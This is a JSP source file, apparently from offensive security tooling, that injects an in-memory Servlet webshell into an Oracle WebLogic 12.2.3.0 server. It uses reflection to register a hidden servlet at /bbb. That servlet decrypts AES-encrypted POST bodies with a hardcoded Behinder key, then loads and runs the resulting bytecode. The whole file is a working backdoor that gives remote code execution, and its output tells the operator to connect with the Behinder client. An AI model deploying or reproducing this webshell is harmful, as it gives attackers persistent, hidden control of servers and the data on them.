<%@ page import="java.io.IOException" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="weblogic.servlet.internal.WebAppServletContext" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="weblogic.servlet.utils.ServletMapping" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="weblogic.servlet.internal.ServletStubImpl" %>
<%@ page import="java.lang.reflect.InvocationTargetException" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="java.security.NoSuchAlgorithmException" %>
<%@ page import="javax.crypto.NoSuchPaddingException" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@ page import="java.security.InvalidKeyException" %>
<%@ page import="javax.crypto.IllegalBlockSizeException" %>
<%@ page import="javax.crypto.BadPaddingException" %>
<%--
  Created by IntelliJ IDEA.
  User: Jack
  Date: 2023/7/2
  Time: 1:00
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%



  // 创建servlet
  HttpServlet httpServlet = new HttpServlet() {
    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
      class U extends ClassLoader{
        U(ClassLoader c){
          super(c);
        }
        public Class g(byte []b){
          return super.defineClass(b,0,b.length);
        }
      }


      String k = "e45e329feb5d925b";
      HttpSession session = req.getSession();
      session.setAttribute("u", k);
      Cipher c = null;
      try {
        c = Cipher.getInstance("AES");
      } catch (NoSuchAlgorithmException e) {
        e.printStackTrace();
      } catch (NoSuchPaddingException e) {
        e.printStackTrace();
      }
      try {
        c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
      } catch (InvalidKeyException e) {
        e.printStackTrace();
      }
      javax.servlet.jsp.PageContext pageContext = javax.servlet.jsp.JspFactory.getDefaultFactory().getPageContext(this, req, resp, null, true, 8192, true);
      try {
        new U(this.getClass().getClassLoader()).g(
                c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(req.getReader().readLine()))).newInstance().equals(pageContext);
      } catch (InstantiationException e) {
        e.printStackTrace();
      } catch (IllegalAccessException e) {
        e.printStackTrace();
      } catch (IllegalBlockSizeException e) {
        e.printStackTrace();
      } catch (BadPaddingException e) {
        e.printStackTrace();
      }
    }
  };

  String URI = "/bbb";
// 获取servletContext
  weblogic.servlet.internal.WebAppServletContext servletContext = (WebAppServletContext) request.getServletContext();

  try {
    // 获取servletMapping
    Method getServletMapping = servletContext.getClass().getDeclaredMethod("getServletMapping");
    getServletMapping.setAccessible(true);
    ServletMapping mappings = (ServletMapping) getServletMapping.invoke(servletContext);

    // 使用ServletStub包装HttpServlet
    Constructor<?> ServletStubImplConstructor = Class.forName("weblogic.servlet.internal.ServletStubImpl").getDeclaredConstructor(String.class, Servlet.class, WebAppServletContext.class);
    ServletStubImplConstructor.setAccessible(true);
    ServletStubImpl servletStub = (ServletStubImpl) ServletStubImplConstructor.newInstance(URI, httpServlet, servletContext);

    // 使用URLMathchHelper包装ServletStub
    Constructor<?> URLMatchHelperConstructor = Class.forName("weblogic.servlet.internal.URLMatchHelper").getDeclaredConstructor(String.class, ServletStubImpl.class);
    URLMatchHelperConstructor.setAccessible(true);
    Object umh = URLMatchHelperConstructor.newInstance(URI, servletStub);

    // 添加到ServletMapping中，即代表注入servlet内存马成功
    if (mappings.get(URI) == null){
      mappings.put(URI, umh);
    }

    response.getWriter().write("\n this page inject the Servlet type memshell, it can be accessed with /weblogic_pro/bbb with behinder. It works on 12.2.3.0 version.");

  } catch (NoSuchMethodException | InvocationTargetException | IllegalAccessException | ClassNotFoundException | InstantiationException e) {
    e.printStackTrace();
  }
%>
